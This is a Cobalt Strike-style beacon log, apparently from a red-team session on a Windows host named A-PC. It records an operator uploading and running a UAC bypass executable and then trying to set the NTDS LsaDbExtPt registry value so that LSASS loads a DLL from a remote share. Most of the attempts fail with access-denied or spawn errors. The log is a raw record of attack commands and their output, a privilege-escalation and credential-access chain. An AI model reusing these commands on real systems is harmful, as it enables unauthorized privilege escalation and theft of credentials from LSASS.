01/27 10:01:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3052; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:02:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3052; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:03:34 [task] 4*************进行vmi启动**********
01/27 10:03:34 [task] 获取管理员权限
01/27 10:03:34 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:03:34 [task] cd c:\RedTeam\
01/27 10:03:34 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:03:34 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:03:34 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:03:34 [task] 执行代码
01/27 10:03:41 [checkin] host called home, sent: 161042 bytes
01/27 10:03:42 [output]
received output:
ERROR:
Description = Access denied


01/27 10:03:42 [output]
received output:
ERROR:
Description = Access denied


01/27 10:03:42 [output]
received output:
ERROR:
Description = Access denied


01/27 10:04:02 [task] 4*************LSA Disver************
01/27 10:04:02 [task] 获取管理员权限
01/27 10:04:02 [task] Tasked beacon to make directory c:\RedTeam\
01/27 10:04:02 [task] cd c:\RedTeam\
01/27 10:04:02 [task] Tasked beacon to upload C:\Users\a\Desktop\ReadTeam\resource\uacbypass64.exe as uacbypass64.exe
01/27 10:04:02 [indicator] file: 743e0bf60cefe43ed7c3af5c0ffd98b9 160256 bytes uacbypass64.exe
01/27 10:04:02 [task] Tasked beacon to execute: c:\RedTeam\uacbypass64.exe 1 notepad.exe
01/27 10:04:02 [task] 执行代码
01/27 10:04:42 [checkin] host called home, sent: 160695 bytes
01/27 10:04:42 [error] could not spawn New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:04:42 [error] could not spawn set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "c:\temp\lsass_lib.dll", "\\share\lulz\lsass_lib.dll": 2
01/27 10:04:54 [input] <neo> exit
01/27 10:04:54 [task] Tasked beacon to exit
01/27 10:05:43 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: a; pid: 3052; os: Windows; version: 6.1; beacon arch: x86 (x64)
01/27 10:05:42 [checkin] host called home, sent: 8 bytes
01/27 10:05:42 [output]
beacon exit.

